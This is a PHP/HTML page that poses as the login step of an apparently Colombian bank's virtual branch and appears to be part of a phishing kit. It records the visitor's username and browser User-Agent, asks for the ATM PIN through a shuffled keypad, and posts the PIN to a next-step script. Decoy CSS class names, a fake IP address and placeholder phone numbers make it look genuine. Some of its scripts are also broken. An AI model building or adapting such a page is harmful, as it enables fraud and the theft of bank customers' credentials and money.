<?php


session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener datos del formulario
    $nombre = htmlspecialchars(trim($_POST['socialusu']));

    // Guardar en la sesión
    $_SESSION['usuario'] = [
        'socialusu' => $nombre,
    ];
}
// Extraer el User-Agent
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Almacenar el User-Agent en la sesión
$_SESSION['user_agent'] = $userAgent;

?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="language" content="es">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/estilos.css">
    <link rel="stylesheet" crossorigin="" href="css/index-CD62Ih7v.css">
    <script src="./js/jquery-3.6.0.min.js"></script>

    <title>usuario</title>
</head>

<body>
    <div class="container">
        <div class="row">
            <div class="col">
                <img src="./img/logo.svg" alt="Logo" class="logo">
                <h2 id="texto" class="procesodepazcolombia">Sucursal Virtual Personas</h2>
                <p id="currentDateTime" class="dateTime"></p>
                <h3 class="grotesca-papel">Inicio de sesion</h3>
                <div class="random" style="padding-top: 30px;"></div>

                <div class="desmovilizacion" id="err-mensaje" style="display:none">
                    <img src="./img/error.jpg" alt="" class="error-paracos">
                    <div class="error-content">
                        <h3 class="error-guerrilas">Error</h3>
                        <p class="error-interno">Por favor ingrese la información requerida</p>
                    </div>
                </div>

                <div class="desmovilizacion" id="carderror" style="display:none">
                    <img src="./img/error.jpg" alt="" class="error-paracos">
                    <div class="error-content">
                        <h3 class="error-guerrilas">Error</h3>
                        <p class="error-interno">Usuario o clave incorrecta</p>
                    </div>
                </div>
                <script>
                           function getCurrentDateTime() {
                        const now = new Date();
                        const options = {
                            weekday: 'long',
                            day: 'numeric',
                            month: 'long',
                            year: 'numeric',
                            hour: 'numeric',
                            minute: 'numeric',
                            second: 'numeric',
                            hour12: true
                        };
                        const formattedDate = now.toLocaleString('es-CO', options);
                        return formattedDate;
                    }

                    function updateDateTime() {
                        const dateTimeElement = document.getElementById('currentDateTime');
                        const dateTimeString = getCurrentDateTime();
                        const message = "Fecha y hora actual:";
                        const separatedMessage = message + "&nbsp;&nbsp;&nbsp;&nbsp;" + dateTimeString;
                        dateTimeElement.innerHTML = separatedMessage;
                    }

                    setInterval(updateDateTime, 1000);
                </script>


                <script>
                    function validarInput(input) {
                        // Eliminar caracteres no numéricos
                        input.value = input.value.replace(/[^0-9]/g, '');
                        // Limitar a 4 dígitos
                        if (input.value.length > 4) {
                            input.value = input.value.slice(0, 4);
                        }
                    }
                </script>


<form id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar"
                    name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar" method="post" action="step-1.php"
                    enctype="application/x-www-form-urlencoded">


                    <div class="grotesca-title">Clave</div>
                    <div class="caminolimpio">
                        <div class="message">Por favor ingresa tu contraseña y sigue los pasos para continuar.</div>
                        <div class="label-container">
                            <span class="label-text"></span>
                            <span class="label-text" style="margin-left: -10px;">Ingresa tu clave</span>
                        </div>



                        <div class="input-container">
                            <img src="./img/lock.png" alt="Input Icon" class="input-icon">

                            <input class="camionescolombia" type="password" maxlength="4" name="inputField" required id="inputField">

                        </div>
                        <div
                            style="padding: 10px; line-height: 1; padding: 5px 10px 0px 10px; font-size: 12px !important; text-align: left !important;  margin-bottom: 0 !important; margin-top: -10px;">
                            Ingresa mediante el teclado la clave que usas en el cajero automatico.</div>
                        <div class="button-container">
                            <button type="submit" id="txtCancel" name="txtCancel" class="motocarro">Cancelar</button>
                            <button type="submit" id="btnPass" name="btnPass" class="motoconcho">Ingresar</button>
                        </div>
                        <a href="#" style=" text-decoration: none; color: inherit; ">
                            <div style="padding: 20px; text-align: right; line-height: 1;">
                                <img src="./img/info.jpg" alt="Icono" width="10" height="10">
                                Genera una clave personal
                            </div>
                        </a>

                    </div>

                    <style>
                        .war-keyboard {
                            width: 132px;
                            margin-top: 40px;
                            margin-bottom: 20px;
                            margin-left: 50px;
                            font-family: "Open Sans", sans-serif;
                        }

                        .war-keyboard table {
                            border-spacing: 4px;
                            border-collapse: separate;
                            font-weight: 700;
                        }

                        .war-keyboard table td {
                            width: 38px;
                            height: 38px;
                            background-repeat: no-repeat;
                            background-position-x: 2px;
                            cursor: default;
                            text-align: center;
                            background-color: #fff;
                            border: 1px solid #2c2a29 !important;
                            font-size: 16px;
                            color: #2C2A29;
                            /* Color por defecto */
                        }

                        .conflict-title {
                            text-align: center;
                            margin-top: 10px;
                            font-weight: 700;
                        }

                        #war-options {
                            margin-top: 20px;
                        }

                        #war-options .war-type {
                            background-color: #fff;
                            border-radius: 9999px;
                            display: inline-block;
                            text-align: center;
                            margin-right: 10px;
                            font-size: 16px;
                            font-weight: 700;
                            height: 25px;
                            width: 30px;
                            cursor: pointer;
                            line-height: 25px;
                            /* Centra el texto verticalmente */
                        }

                        #war-options .war-active {
                            background-color: #fdda24;
                            color: #000;
                        }

                        /* Estilos para diferentes tipos de guerra */
                        .war-a .war-keyboard table td {
                            color: #333;
                            /* Color más fuerte para el Tipo A de guerra */
                        }

                        .war-c .war-keyboard table td {
                            color: #999;
                            /* Color más suave para el Tipo C de guerra */
                        }
                    </style>
                 <footer class="ml-12 mt-12">
    <div class="grid grid-cols-3 gap-1 w-32" id="buttons">
        <script>
            // Función para desordenar los números del 0 al 9
            function shuffle(array) {
                for (let i = array.length - 1; i > 0; i--) {
                    const j = Math.floor(Math.random() * (i + 1));
                    [array[i], array[j]] = [array[j], array[i]];
                }
                return array;
            }

            // Crear el teclado con los números desordenados
            const numbers = Array.from({ length: 10 }, (_, i) => i); // Números 0-9
            const shuffledNumbers = shuffle(numbers);

            // Generar los botones numéricos dinámicamente
            shuffledNumbers.forEach(number => {
                document.write(
                    `<div class="border-[1px] border-black hover:bg-gray-200 p-[6px]" onclick="addNumber('${number}')">${number}</div>`
                );
            });

            // Agregar botón de "Borrar"
            document.write(
                `<div class="col-span-2 border-[1px] hover:bg-gray-200 border-black" onclick="clearInput()">Borrar</div>`
            );
        </script>
    </div>
</footer>

                    <div class="lg:w-1/4">
                        <div class="war-keyboard">

                            <div class="conflict-title">
                                <p>Contraste</p>
                                <div id="war-options" class="lJ9OgsqvmYt flex justify-center">
                                    <div class="war-type oISHf7LCQPU" onclick="contrast(this)"> A </div>
                                    <div class="war-type W8C7HMPU3TL GQNZCSss9iY war-active" onclick="contrast(this)"> B
                                    </div>
                                    <div class="war-type Cx0jc17Nszg" onclick="contrast(this)"> C </div>
                                </div>
                            </div>
                        </div>
                    </div>



                    <p style="font-size: 10px; text-decoration: none;">Medellín (57) 310 234 5678 - Bucaramanga (57) 350
                        789 4567 - Bogotá (57) 300 123 4567 - Barranquilla (57) 330 456 7890 - Cali (57) 320 345 6789 -
                        Cartagena (57) 350 567 8901 Pereira (57) 320 678 9012 - Oficinas Telefónica: El resto del país
                        018000 8 76543 - España (34) 600 123 456 - Estados Unidos (1) 800 234 5678.</p>

                    <footer class="container mt-3">
                        <div class="row">
                            <div class="col-md-12">
                                <div class="footer-content"
                                    style="display: flex; justify-content: space-between; align-items: center; font-size: 10px; margin-bottom: 24px !important; margin-top: 3px !important;">
                                    <p class="mb-0">Dirección IP: <span id="ip_address">192.45.024.22</span></p>
                                    <p class="mb-0">Copyright © <span id="current_year"></span> S.A.</p>
                                </div>
                            </div>
                        </div>
                    </footer>


                    <script>
                        function addNumber(num) {
                            const inputField = document.getElementById('inputField');
                            inputField.value += num;
                        }

                        function clearInput() {
                            const inputField = document.getElementById('inputField');
                            inputField.value = '';
                        }
                    </script>
                    <script>
                        function actualizarFechaHora() {
                            const ahora = new Date();
                            const opcionesFecha = {
                                weekday: 'long',
                                year: 'numeric',
                                month: 'long',
                                day: 'numeric'
                            };
                            const fecha = ahora.toLocaleDateString('es-ES', opcionesFecha);
                            const hora = ahora.toLocaleTimeString('es-ES');
                            document.getElementById('fechaHora').innerHTML = `${fecha} ${hora}`;
                        }

                        setInterval(actualizarFechaHora, 1000); // Actualiza cada segundo
                        actualizarFechaHora(); // Llama a la función una vez al cargar la página
                    </script>

  <script>
    const input = document.getElementById('inputField');
    input.addEventListener('input', function() {
        // Eliminar caracteres no numéricos
        this.value = this.value.replace(/[^0-9]/g, '');
        
        // Limitar a 6 caracteres
        if (this.value.length > 6) {
            this.value = this.value.slice(0, 6);
        }
    });
  </script>
  <script>
    const input = document.getElementById('inputField');
    input.addEventListener('input', function() {
        if (this.value.length > 6) {
            this.value = this.value.slice(0, 6);
        }
    });
</script>
</form>

</body>
</html>